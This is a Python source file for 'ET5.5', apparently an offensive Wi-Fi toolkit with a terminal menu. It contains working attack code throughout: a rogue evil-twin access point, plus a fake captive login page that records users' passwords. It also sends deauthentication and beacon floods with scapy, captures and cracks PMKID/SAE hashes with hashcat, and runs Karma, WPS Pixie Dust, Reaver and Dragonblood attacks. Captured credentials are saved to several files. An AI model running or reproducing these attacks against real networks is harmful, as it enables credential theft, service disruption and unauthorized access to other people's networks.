import curses
import os
import time
import subprocess
import json
import yaml
import logging
import threading
import random
import re
import shutil
import atexit
import platform
from tqdm import tqdm
from fpdf import FPDF
from scapy.all import *
from flask import Flask, request, render_template_string
from termcolor import colored  # pip install termcolor

# Setup logging
logging.basicConfig(filename='evil_twin.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Global variables
captured_creds = []
captured_pmkids = []
cracked_creds = []
is_running = False
app = Flask(__name__)
iface = 'wlan0'  # Default interface, configurable
monitor_iface = 'wlan0mon'  # Assume monitor mode enabled
monitor_enabled = False
ap_running = False
os_type = platform.system()
is_termux = 'TERMUX_VERSION' in os.environ

# ASCII Banner for ET5.5
BANNER = colored("""
  ______ _   _ _____ __   __   ___  
 |  ____| \ | |_   _\ \ / /  / _ \ 
 | |__  |  \| | | |  \ V /  | | | |
 |  __| | . ` | | |   > <   | | | |
 | |____| |\  |_| |_ / . \  | |_| |
 |______|_| \_|_____|_/ \_\  \___/ 
                                   
ET5.5 - Developed by the Background Gremlin Group
""", 'green')

# Validation functions
def validate_ssid(ssid):
    if not ssid or len(ssid) > 32:
        return False
    return True

def validate_channel(channel):
    try:
        ch = int(channel)
        return 1 <= ch <= 14
    except ValueError:
        return False

def validate_mac(mac):
    return bool(re.match(r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$', mac)) or mac == 'ff:ff:ff:ff:ff:ff'

def validate_input(prompt, validator):
    while True:
        value = input(prompt)
        if validator(value):
            return value
        print(colored("Invalid input. Try again.", 'red'))

# Tool check
def check_tool(tool):
    if shutil.which(tool) is None:
        print(colored(f"{tool} not found. Please install it.", 'red'))
        logging.warning(f"{tool} not found")
        return False
    return True

# Check if root (on Windows, check admin)
def is_root():
    if os_type == 'Windows':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        return os.getuid() == 0

# Cleanup on exit
def cleanup():
    disable_monitor_mode()
    stop_evil_twin()

atexit.register(cleanup)

# Platform-specific commands
def platform_enable_monitor():
    if os_type == 'Linux' or is_termux:
        try:
            if is_termux:
                # Termux specific, assume wireless tools installed
                subprocess.check_call(['su', '-c', 'ifconfig', iface, 'down'])
                subprocess.check_call(['su', '-c', 'iwconfig', iface, 'mode', 'monitor'])
                subprocess.check_call(['su', '-c', 'ifconfig', iface, 'up'])
            else:
                subprocess.check_call(['ifconfig', iface, 'down'])
                subprocess.check_call(['iwconfig', iface, 'mode', 'monitor'])
                subprocess.check_call(['ifconfig', iface, 'up'])
            return True
        except:
            return False
    elif os_type == 'Windows':
        print(colored("Monitor mode on Windows requires specific drivers (e.g., Npcap). Limited support.", 'yellow'))
        return False  # Implement if possible with netsh or other
    return False

def platform_disable_monitor():
    if os_type == 'Linux' or is_termux:
        try:
            if is_termux:
                subprocess.check_call(['su', '-c', 'ifconfig', monitor_iface, 'down'])
                subprocess.check_call(['su', '-c', 'iwconfig', monitor_iface, 'mode', 'managed'])
                subprocess.check_call(['su', '-c', 'ifconfig', monitor_iface, 'up'])
            else:
                subprocess.check_call(['ifconfig', monitor_iface, 'down'])
                subprocess.check_call(['iwconfig', monitor_iface, 'mode', 'managed'])
                subprocess.check_call(['ifconfig', monitor_iface, 'up'])
            return True
        except:
            return False
    elif os_type == 'Windows':
        return False
    return False

# Function to enable monitor mode
def enable_monitor_mode():
    global monitor_enabled, monitor_iface
    if not is_root():
        print(colored("Requires admin/root privileges.", 'red'))
        return False
    if not check_tool('iwconfig') or not check_tool('ifconfig'):
        return False
    if platform_enable_monitor():
        monitor_iface = iface
        monitor_enabled = True
        logging.info("Monitor mode enabled.")
        print(colored("Monitor mode enabled.", 'green'))
        return True
    else:
        print(colored("Failed to enable monitor mode.", 'red'))
        return False

# Function to disable monitor mode
def disable_monitor_mode():
    global monitor_enabled
    if is_root():
        if platform_disable_monitor():
            monitor_enabled = False
            logging.info("Monitor mode disabled.")
            print(colored("Monitor mode disabled.", 'green'))
        else:
            print(colored("Failed to disable monitor mode.", 'red'))

# Scan for APs using airodump-ng
def scan_aps():
    if os_type != 'Linux' and not is_termux:
        print(colored("Scanning not supported on this platform.", 'red'))
        return []
    if not is_root():
        print(colored("Scanning requires root. Limited scan.", 'yellow'))
        return []
    if not check_tool('airodump-ng'):
        return []
    try:
        print(colored("Starting scan... Press Ctrl+C after 10 seconds to stop.", 'cyan'))
        with tqdm(total=10, desc="Scanning APs", bar_format='{l_bar}{bar} | {n_fmt}/{total_fmt}', refresh_rate=0.1) as pbar:
            proc = subprocess.Popen(['airodump-ng', monitor_iface])
            for _ in range(10):
                time.sleep(1)
                pbar.update(1)
        proc.terminate()
        print(colored("Scan complete. Manually enter target SSID and channel.", 'green'))
        return []  # For TUI, user inputs manually
    except subprocess.SubprocessError as e:
        logging.error(f"Scan error: {e}")
        print(colored("Error during scan.", 'red'))
        return []
    except Exception as e:
        logging.error(f"Unexpected scan error: {e}")
        print(colored("Unexpected error during scan.", 'red'))
        return []

# Start Evil Twin AP
def start_evil_twin(ssid, channel):
    global is_running, ap_running
    if os_type != 'Linux' and not is_termux:
        print(colored("Evil Twin not supported on this platform.", 'red'))
        return
    if not is_root():
        print(colored("Cannot start AP without root.", 'red'))
        return
    if not check_tool('hostapd') or not check_tool('dnsmasq') or not check_tool('iptables') or not check_tool('ifconfig'):
        return
    try:
        print(colored("Configuring hostapd and dnsmasq...", 'cyan'))
        # Write hostapd.conf
        with open('hostapd.conf', 'w') as f:
            f.write(f"interface={iface}\n")
            f.write("driver=nl80211\n")
            f.write(f"ssid={ssid}\n")
            f.write(f"channel={channel}\n")
            f.write("hw_mode=g\n")
        # Write dnsmasq.conf
        with open('dnsmasq.conf', 'w') as f:
            f.write(f"interface={iface}\n")
            f.write("dhcp-range=10.0.0.10,10.0.0.250,12h\n")
            f.write("dhcp-option=3,10.0.0.1\n")
            f.write("dhcp-option=6,10.0.0.1\n")
        # Set IP
        if is_termux:
            subprocess.check_call(['su', '-c', 'ifconfig', iface, '10.0.0.1/24', 'up'])
        else:
            subprocess.check_call(['ifconfig', iface, '10.0.0.1/24', 'up'])
        # Start dnsmasq
        dns_proc = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf'])
        # Start hostapd
        host_proc = subprocess.Popen(['hostapd', 'hostapd.conf'])
        # Enable forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
            fd.write('1')
        # IPTables for redirect
        subprocess.check_call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', '5000'])
        print(colored("Evil Twin AP started.", 'green'))
        logging.info("Evil Twin AP started.")
        is_running = True
        ap_running = True
        # Start captive portal in thread
        threading.Thread(target=run_portal).start()
    except subprocess.CalledProcessError as e:
        logging.error(f"Error starting Evil Twin: {e}")
        print(colored("Error starting AP. Check configurations.", 'red'))
    except FileNotFoundError as e:
        logging.error(f"File error: {e}")
        print(colored("Configuration file error.", 'red'))
    except PermissionError:
        print(colored("Permission denied. Ensure root.", 'red'))
    except Exception as e:
        logging.error(f"Unexpected error starting Evil Twin: {e}")
        print(colored("Unexpected error starting AP.", 'red'))

# Stop Evil Twin
def stop_evil_twin():
    global is_running, ap_running
    if os_type != 'Linux' and not is_termux:
        return
    try:
        subprocess.call(['killall', 'dnsmasq', 'hostapd', 'airbase-ng'], stderr=subprocess.DEVNULL)
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
            fd.write('0')
        subprocess.call(['iptables', '--flush'], stderr=subprocess.DEVNULL)
        subprocess.call(['iptables', '--flush', '-t', 'nat'], stderr=subprocess.DEVNULL)
        print(colored("Evil Twin stopped.", 'green'))
        logging.info("Evil Twin stopped.")
        is_running = False
        ap_running = False
    except Exception as e:
        logging.error(f"Error stopping Evil Twin: {e}")
        print(colored("Error stopping AP.", 'red'))

# Deauth attack using scapy
def deauth_attack(bssid, client='ff:ff:ff:ff:ff:ff', count=10):
    if os_type != 'Linux' and not is_termux:
        print(colored("Deauth not supported on this platform.", 'red'))
        return
    if not is_root():
        print(colored("Deauth requires root.", 'red'))
        return
    try:
        pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        with tqdm(total=count, desc="Sending Deauth Packets", refresh_rate=0.1) as pbar:  # Increased refresh rate for responsiveness
            for _ in range(count):
                sendp(pkt, iface=monitor_iface, verbose=0)
                pbar.update(1)
                time.sleep(0.1)
        print(colored(f"Deauth sent to {client} from {bssid}.", 'green'))
        logging.info(f"Deauth successful: {bssid} -> {client}")
    except OSError as e:
        logging.error(f"Deauth error: {e}")
        print(colored("Interface error in deauth.", 'red'))
    except Exception as e:
        logging.error(f"Unexpected deauth error: {e}")
        print(colored("Unexpected error in deauth.", 'red'))

# Beacon spam
def beacon_spam(ssid_list, duration=10):
    if os_type != 'Linux' and not is_termux:
        print(colored("Beacon spam not supported on this platform.", 'red'))
        return
    if not is_root():
        print(colored("Beacon spam requires root.", 'red'))
        return
    try:
        def send_beacons():
            for _ in range(duration * 10):
                ssid = random.choice(ssid_list)
                dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                              addr2=RandMAC(), addr3=RandMAC())
                beacon = Dot11Beacon(cap='ESS+privacy')
                essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
                pkt = RadioTap() / dot11 / beacon / essid
                sendp(pkt, iface=monitor_iface, verbose=0)
                time.sleep(0.1)
        threading.Thread(target=send_beacons).start()
        with tqdm(total=duration, desc="Beacon Spamming", refresh_rate=0.1) as pbar:  # Increased refresh rate
            for _ in range(duration):
                time.sleep(1)
                pbar.update(1)
        print(colored("Beacon spam complete.", 'green'))
        logging.info("Beacon spam successful.")
    except OSError as e:
        logging.error(f"Beacon spam error: {e}")
        print(colored("Interface error in beacon spam.", 'red'))
    except Exception as e:
        logging.error(f"Unexpected beacon spam error: {e}")
        print(colored("Unexpected error in beacon spam.", 'red'))

# PMKID/SAE Attack (supports WPA2 PMKID and WPA3 SAE)
def pmkid_attack(duration=30):
    if os_type != 'Linux' and not is_termux:
        print(colored("PMKID attack not supported on this platform.", 'red'))
        return
    if not is_root():
        print(colored("PMKID attack requires root.", 'red'))
        return
    if not check_tool('hcxdumptool') or not check_tool('hcxpcapngtool'):
        return
    try:
        capture_file = 'pmkid.pcapng'
        print(colored("Starting PMKID/SAE capture with hcxdumptool (supports WPA3)...", 'cyan'))
        proc = subprocess.Popen(['hcxdumptool', '-i', monitor_iface, '--enable_status=1', '-o', capture_file])
        with tqdm(total=duration, desc="Capturing PMKIDs/SAE", refresh_rate=0.1) as pbar:  # Increased refresh rate
            for _ in range(duration):
                time.sleep(1)
                pbar.update(1)
        proc.terminate()
        # Process capture
        hash_file = 'pmkid.hc22000'
        subprocess.check_call(['hcxpcapngtool', '-o', hash_file, capture_file])
        with open(hash_file, 'r') as f:
            pmkids = f.readlines()
        captured_pmkids.extend(pmkids)
        print(colored(f"Captured {len(pmkids)} PMKIDs/SAE hashes.", 'green'))
        logging.info(f"PMKID/SAE capture successful: {len(pmkids)} captured.")
    except subprocess.CalledProcessError as e:
        logging.error(f"PMKID processing error: {e}")
        print(colored("Error processing PMKID capture.", 'red'))
    except FileNotFoundError:
        print(colored("Capture file not found.", 'red'))
    except Exception as e:
        logging.error(f"Unexpected PMKID error: {e}")
        print(colored("Unexpected error in PMKID attack.", 'red'))

# Bettercap PMKID/SAE Capture
def bettercap_pmkid_capture(duration=30):
    if os_type != 'Linux' and not is_termux:
        print(colored("Bettercap PMKID not supported on this platform.", 'red'))
        return
    if not is_root():
        print(colored("Bettercap PMKID capture requires root.", 'red'))
        return
    if not check_tool('bettercap') or not check_tool('hcxpcapngtool'):
        return
    try:
        cap_file = 'bettercap_pmkid.pcap'
        print(colored("Starting PMKID/SAE capture with bettercap (supports WPA3)...", 'cyan'))
        eval_cmd = f"wifi.recon on; wifi.ap new; set wifi.handshakes.file {cap_file}; sleep {duration}; quit"
        proc = subprocess.Popen(['bettercap', '-iface', monitor_iface, '--silent', '-eval', eval_cmd])
        with tqdm(total=duration, desc="Capturing PMKIDs/SAE with Bettercap", refresh_rate=0.1) as pbar:  # Increased refresh rate
            for _ in range(duration):
                time.sleep(1)
                pbar.update(1)
        proc.terminate()
        # Process capture to hc22000
        hash_file = 'bettercap_pmkid.hc22000'
        subprocess.check_call(['hcxpcapngtool', '-o', hash_file, cap_file])
        with open(hash_file, 'r') as f:
            pmkids = f.readlines()
        captured_pmkids.extend(pmkids)
        print(colored(f"Captured {len(pmkids)} PMKIDs/SAE with Bettercap.", 'green'))
        logging.info(f"Bettercap PMKID/SAE capture successful: {len(pmkids)} captured.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Bettercap PMKID processing error: {e}")
        print(colored("Error processing Bettercap PMKID capture.", 'red'))
    except FileNotFoundError:
        print(colored("Capture file not found.", 'red'))
    except Exception as e:
        logging.error(f"Unexpected Bettercap PMKID error: {e}")
        print(colored("Unexpected error in Bettercap PMKID capture.", 'red'))

# Crack PMKID/SAE using hashcat
def crack_pmkid():
    if not check_tool('hashcat'):
        return
    wordlist = input("Enter wordlist path: ")
    if not os.path.exists(wordlist):
        print(colored("Wordlist not found.", 'red'))
        return
    hash_file = 'pmkid.hc22000'  # Assuming primary, or merge if multiple
    if not os.path.exists(hash_file):
        print(colored("PMKID/SAE hash file not found. Run PMKID attack first.", 'red'))
        return
    try:
        print(colored("Starting hashcat cracking for PMKID/SAE...", 'cyan'))
        cracked_file = 'cracked.txt'
        proc = subprocess.Popen(['hashcat', '-m', '22000', hash_file, wordlist, '-o', cracked_file, '--potfile-disable'])
        with tqdm(desc="Cracking PMKIDs/SAE (progress not accurate)", unit="s", refresh_rate=0.1) as pbar:  # Increased refresh rate
            while proc.poll() is None:
                time.sleep(1)
                pbar.update(1)
        if proc.returncode != 0:
            print(colored("Hashcat failed.", 'red'))
            return
        with open(cracked_file, 'r') as f:
            for line in f:
                if ':' in line:
                    hashline, password = line.rsplit(':', 1)
                    cracked_creds.append({'hash': hashline.strip(), 'password': password.strip()})
        print(colored(f"Cracked {len(cracked_creds)} PMKIDs/SAE.", 'green'))
        logging.info(f"PMKID/SAE cracking successful: {len(cracked_creds)} cracked.")
    except subprocess.SubprocessError as e:
        logging.error(f"Hashcat error: {e}")
        print(colored("Error running hashcat.", 'red'))
    except Exception as e:
        logging.error(f"Unexpected cracking error: {e}")
        print(colored("Unexpected error in cracking.", 'red'))

# Bettercap Console
def start_bettercap():
    if os_type != 'Linux' and not is_termux:
        print(colored("Bettercap not supported on this platform.", 'red'))
        return
    if not is_root():
        print(colored("Bettercap requires root.", 'red'))
        return
    if not check_tool('bettercap'):
        return
    try:
        print(colored("Starting bettercap console... Ctrl+C to exit.", 'cyan'))
        subprocess.call(['bettercap', '-iface', monitor_iface])
        print(colored("Bettercap console exited.", 'green'))
    except subprocess.SubprocessError as e:
        logging.error(f"Bettercap error: {e}")
        print(colored("Error starting bettercap.", 'red'))
    except Exception as e:
        logging.error(f"Unexpected bettercap error: {e}")
        print(colored("Unexpected error with bettercap.", 'red'))

# Wifite Integration
def run_wifite():
    if os_type != 'Linux' and not is_termux:
        print(colored("Wifite not supported on this platform.", 'red'))
        return
    if not is_root():
        print(colored("Wifite requires root.", 'red'))
        return
    if not check_tool('wifite'):
        print(colored("Wifite not installed. Install it for automation.", 'red'))
        return
    try:
        print(colored("Starting Wifite automation... Ctrl+C to exit.", 'cyan'))
        subprocess.call(['wifite'])
        print(colored("Wifite exited.", 'green'))
        logging.info("Wifite session completed.")
    except Exception as e:
        logging.error(f"Wifite error: {e}")
        print(colored("Error running Wifite.", 'red'))

# WPS Pixie Dust Attack using bully
def pixie_dust_attack(bssid, channel):
    if os_type != 'Linux' and not is_termux:
        print(colored("Pixie Dust attack not supported on this platform.", 'red'))
        return
    if not is_root():
        print(colored("Pixie Dust attack requires root.", 'red'))
        return
    if not check_tool('bully'):
        print(colored("Bully not installed. Install it for Pixie Dust attack.", 'red'))
        return
    try:
        print(colored("Starting WPS Pixie Dust attack...", 'cyan'))
        proc = subprocess.Popen(['bully', monitor_iface, '-b', bssid, '-c', str(channel), '-d', '-v', '3'])
        proc.wait()  # Wait for the process to complete
        if proc.returncode == 0:
            print(colored("Pixie Dust attack successful.", 'green'))
            logging.info("Pixie Dust attack successful.")
        else:
            print(colored("Pixie Dust attack failed.", 'red'))
            logging.info("Pixie Dust attack failed.")
    except Exception as e:
        logging.error(f"Pixie Dust error: {e}")
        print(colored("Error in Pixie Dust attack.", 'red'))

# Reaver WPS Brute Force
def reaver_attack(bssid, channel):
    if os_type != 'Linux' and not is_termux:
        print(colored("Reaver attack not supported on this platform.", 'red'))
        return
    if not is_root():
        print(colored("Reaver attack requires root.", 'red'))
        return
    if not check_tool('reaver'):
        print(colored("Reaver not installed. Install it for WPS brute force.", 'red'))
        return
    try:
        print(colored("Starting Reaver WPS brute force attack...", 'cyan'))
        proc = subprocess.Popen(['reaver', '-i', monitor_iface, '-b', bssid, '-c', str(channel), '-vv'])
        proc.wait()
        if proc.returncode == 0:
            print(colored("Reaver attack successful.", 'green'))
            logging.info("Reaver attack successful.")
        else:
            print(colored("Reaver attack failed.", 'red'))
            logging.info("Reaver attack failed.")
    except Exception as e:
        logging.error(f"Reaver error: {e}")
        print(colored("Error in Reaver attack.", 'red'))

# WPA3 Dragonblood Attack (using dragonslayer for invalid curve attack)
def dragonblood_attack(iface):
    if os_type != 'Linux' and not is_termux:
        print(colored("Dragonblood attack not supported on this platform.", 'red'))
        return
    if not is_root():
        print(colored("Dragonblood attack requires root.", 'red'))
        return
    if not check_tool('dragonslayer'):
        print(colored("Dragonslayer not installed. Install from https://github.com/vanhoefm/dragonslayer.", 'red'))
        return
    try:
        print(colored("Starting WPA3 Dragonblood attack (invalid curve)...", 'cyan'))
        proc = subprocess.Popen(['dragonslayer', iface])
        proc.wait()
        if proc.returncode == 0:
            print(colored("Dragonblood attack successful.", 'green'))
            logging.info("Dragonblood attack successful.")
        else:
            print(colored("Dragonblood attack failed.", 'red'))
            logging.info("Dragonblood attack failed.")
    except Exception as e:
        logging.error(f"Dragonblood error: {e}")
        print(colored("Error in Dragonblood attack.", 'red'))

# Karma Attack (using airbase-ng with -P for probe any)
def karma_attack(channel, duration=60):
    if os_type != 'Linux' and not is_termux:
        print(colored("Karma attack not supported on this platform.", 'red'))
        return
    if not is_root():
        print(colored("Karma attack requires root.", 'red'))
        return
    if not check_tool('airbase-ng') or not check_tool('dnsmasq') or not check_tool('iptables'):
        return
    try:
        print(colored("Starting Karma AP...", 'cyan'))
        # Start airbase-ng in Karma mode
        proc = subprocess.Popen(['airbase-ng', '-P', '-C', '30', '-c', str(channel), '-v', monitor_iface])
        time.sleep(5)  # Wait for at0 interface
        # Set up DHCP etc. similar to evil twin
        with open('dnsmasq.conf', 'w') as f:
            f.write("interface=at0\n")
            f.write("dhcp-range=10.0.0.10,10.0.0.250,12h\n")
            f.write("dhcp-option=3,10.0.0.1\n")
            f.write("dhcp-option=6,10.0.0.1\n")
        if is_termux:
            subprocess.check_call(['su', '-c', 'ifconfig', 'at0', '10.0.0.1/24', 'up'])
        else:
            subprocess.check_call(['ifconfig', 'at0', '10.0.0.1/24', 'up'])
        dns_proc = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf'])
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
            fd.write('1')
        subprocess.check_call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', '5000'])
        threading.Thread(target=run_portal).start()
        with tqdm(total=duration, desc="Running Karma Attack", refresh_rate=0.1) as pbar:  # Increased refresh rate
            for _ in range(duration):
                time.sleep(1)
                pbar.update(1)
        proc.terminate()
        dns_proc.terminate()
        stop_evil_twin()  # Reuse to clean up
        print(colored("Karma attack complete.", 'green'))
        logging.info("Karma attack successful.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Karma error: {e}")
        print(colored("Error in Karma setup.", 'red'))
    except Exception as e:
        logging.error(f"Unexpected Karma error: {e}")
        print(colored("Unexpected error in Karma attack.", 'red'))

# Captive portal
def run_portal():
    @app.route('/', methods=['GET', 'POST'])
    def index():
        if request.method == 'POST':
            user = request.form.get('user', '')
            pwd = request.form.get('pass', '')
            captured_creds.append({'user': user, 'pass': pwd})
            logging.info(f"Captured: {user}:{pwd}")
            print(colored(f"Captured credentials: {user}:{pwd}", 'green'))
            return "Connected successfully!"
        return render_template_string("""
        <h1>WiFi Login</h1>
        <form method="post">
            Username: <input name="user"><br>
            Password: <input name="pass" type="password"><br>
            <input type="submit">
        </form>
        """)

    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

# Save data
def save_data():
    try:
        # TXT
        with open('creds.txt', 'w') as f:
            for cred in captured_creds:
                f.write(f"{cred['user']}:{cred['pass']}\n")
            for pmkid in captured_pmkids:
                f.write(f"PMKID/SAE: {pmkid}")
            for crack in cracked_creds:
                f.write(f"Cracked: {crack['hash']}:{crack['password']}\n")
        # JSON
        with open('creds.json', 'w') as f:
            json.dump({'creds': captured_creds, 'pmkids': captured_pmkids, 'cracked': cracked_creds}, f)
        # YAML
        with open('creds.yaml', 'w') as f:
            yaml.dump({'creds': captured_creds, 'pmkids': captured_pmkids, 'cracked': cracked_creds}, f)
        # PDF
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size=12)
        pdf.cell(200, 10, txt="Captured Credentials Report", ln=1, align='C')
        for cred in captured_creds:
            pdf.cell(200, 10, txt=f"User: {cred['user']}, Pass: {cred['pass']}", ln=1)
        for pmkid in captured_pmkids:
            pdf.cell(200, 10, txt=f"PMKID/SAE: {pmkid}", ln=1)
        pdf.cell(200, 10, txt="Cracked PMKIDs/SAE", ln=1, align='C')
        for crack in cracked_creds:
            pdf.cell(200, 10, txt=f"Hash: {crack['hash']}, Password: {crack['password']}", ln=1)
        pdf.output("report.pdf")
        print(colored("Data saved to txt, json, yaml, pdf.", 'green'))
        logging.info("Data saved.")
    except FileNotFoundError as e:
        logging.error(f"Save error: {e}")
        print(colored("Error opening file for saving.", 'red'))
    except Exception as e:
        logging.error(f"Unexpected save error: {e}")
        print(colored("Unexpected error saving data.", 'red'))

# Enhanced TUI Main with optimized navigation (number keys for selection)
def tui_main(stdscr):
    curses.curs_set(0)
    stdscr.clear()
    stdscr.addstr(0, 0, BANNER)
    stdscr.refresh()

    root_status = "Admin/Root" if is_root() else "Non-Admin (Limited)"
    stdscr.addstr(8, 0, colored(f"Platform: {os_type}{' (Termux)' if is_termux else ''}", 'cyan'))
    stdscr.addstr(9, 0, colored(f"Status: {root_status}", 'yellow' if not is_root() else 'green'))

    menu = [
        "1. Enable Monitor Mode",
        "2. Disable Monitor Mode",
        "3. Scan APs",
        "4. Start Evil Twin",
        "5. Stop Evil Twin",
        "6. Deauth Attack",
        "7. Beacon Spam",
        "8. PMKID/SAE Attack (hcxdumptool)",
        "9. Bettercap PMKID/SAE Capture",
        "10. Karma Attack",
        "11. Crack PMKID/SAE",
        "12. Bettercap Console",
        "13. Run Wifite Automation",
        "14. WPS Pixie Dust Attack",
        "15. Reaver WPS Brute Force",
        "16. WPA3 Dragonblood Attack",
        "17. Save Data",
        "18. View Logs",
        "19. Exit"
    ]

    current_row = 0
    while True:
        stdscr.addstr(11, 0, colored(f"Monitor Mode: {'Enabled' if monitor_enabled else 'Disabled'}", 'green' if monitor_enabled else 'red'))
        stdscr.addstr(12, 0, colored(f"AP Running: {'Yes' if ap_running else 'No'}", 'green' if ap_running else 'red'))
        stdscr.addstr(13, 0, colored(f"Captured Creds: {len(captured_creds)}", 'cyan'))
        stdscr.addstr(14, 0, colored(f"Captured PMKIDs/SAE: {len(captured_pmkids)}", 'cyan'))
        stdscr.addstr(15, 0, colored(f"Cracked PMKIDs/SAE: {len(cracked_creds)}", 'cyan'))

        for idx, item in enumerate(menu):
            if idx == current_row:
                stdscr.addstr(17 + idx, 0, item, curses.A_REVERSE)
            else:
                stdscr.addstr(17 + idx, 0, item)
        stdscr.refresh()

        key = stdscr.getch()
        if key == curses.KEY_UP and current_row > 0:
            current_row -= 1
        elif key == curses.KEY_DOWN and current_row < len(menu) - 1:
            current_row += 1
        elif 49 <= key <= 57 or 97 <= key <= 105:  # 1-9 or numpad 1-9
            num = key - 48 if 49 <= key <= 57 else key - 96
            if 1 <= num <= len(menu):
                current_row = num - 1
                key = 10  # Simulate enter
        if key == 10:  # Enter
            stdscr.clear()
            if current_row == 0:
                enable_monitor_mode()
            elif current_row == 1:
                disable_monitor_mode()
            elif current_row == 2:
                scan_aps()
            elif current_row == 3:
                ssid = validate_input("Enter SSID: ", validate_ssid)
                channel = validate_input("Enter Channel: ", validate_channel)
                start_evil_twin(ssid, int(channel))
            elif current_row == 4:
                stop_evil_twin()
            elif current_row == 5:
                bssid = validate_input("Enter BSSID: ", validate_mac)
                client = validate_input("Enter Client MAC (ff:ff:ff:ff:ff:ff for all): ", validate_mac)
                deauth_attack(bssid, client)
            elif current_row == 6:
                ssids_input = input("Enter AP names (comma separated): ")
                ssids = [s.strip() for s in ssids_input.split(',')]
                if all(validate_ssid(s) for s in ssids):
                    beacon_spam(ssids)
                else:
                    print(colored("Invalid SSIDs.", 'red'))
            elif current_row == 7:
                pmkid_attack()
            elif current_row == 8:
                bettercap_pmkid_capture()
            elif current_row == 9:
                channel = validate_input("Enter Channel: ", validate_channel)
                karma_attack(int(channel))
            elif current_row == 10:
                crack_pmkid()
            elif current_row == 11:
                start_bettercap()
            elif current_row == 12:
                run_wifite()
            elif current_row == 13:
                bssid = validate_input("Enter BSSID: ", validate_mac)
                channel = validate_input("Enter Channel: ", validate_channel)
                pixie_dust_attack(bssid, int(channel))
            elif current_row == 14:
                bssid = validate_input("Enter BSSID: ", validate_mac)
                channel = validate_input("Enter Channel: ", validate_channel)
                reaver_attack(bssid, int(channel))
            elif current_row == 15:
                dragonblood_attack(monitor_iface)
            elif current_row == 16:
                save_data()
            elif current_row == 17:
                try:
                    with open('evil_twin.log', 'r') as f:
                        logs = f.read()
                    print(logs)
                except FileNotFoundError:
                    print(colored("Log file not found.", 'red'))
                except Exception as e:
                    print(colored(f"Error reading logs: {e}", 'red'))
            elif current_row == 18:
                disable_monitor_mode()
                break
            stdscr.clear()
            stdscr.addstr(0, 0, BANNER)
            stdscr.refresh()

if __name__ == '__main__':
    if not is_root():
        print(colored("Running without admin/root: Limited features.", 'yellow'))
    curses.wrapper(tui_main)
